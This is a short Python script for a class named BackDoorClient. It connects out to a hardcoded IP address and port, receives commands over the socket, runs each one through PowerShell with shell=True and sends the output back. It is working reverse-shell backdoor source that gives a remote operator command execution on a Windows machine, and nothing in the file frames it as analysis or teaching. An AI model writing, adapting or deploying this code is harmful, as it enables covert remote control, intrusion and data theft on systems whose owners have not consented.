import threading
import subprocess
import socket
import os

class BackDoorClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.eom_delimiter = b"    <Executed>"
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.socket.connect((self.host, self.port))

    def send_command(self, command):
        if command.lower() == 'exit':
            self.socket.close()
            return

        if command[:2] == "cd":
            os.chdir(str(command[3:]))
        else:
            command = f'powershell -Command "{command}"'

        def run_command(command):
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
            stdout, stderr = process.communicate()
            output = stdout + stderr
            if "Speak-Text" in command:
                return
            self.socket.send(output.encode() + self.eom_delimiter)

        thread = threading.Thread(target=run_command, args=(command,))
        thread.start()

    def run(self):
        self.connect()

        while True:
            try:
                command = self.socket.recv(12024).decode()
                self.send_command(command)
            except Exception as e:
                print("Error:", e)
                break

client = BackDoorClient('10.76.36.147', 9999)
client.run()
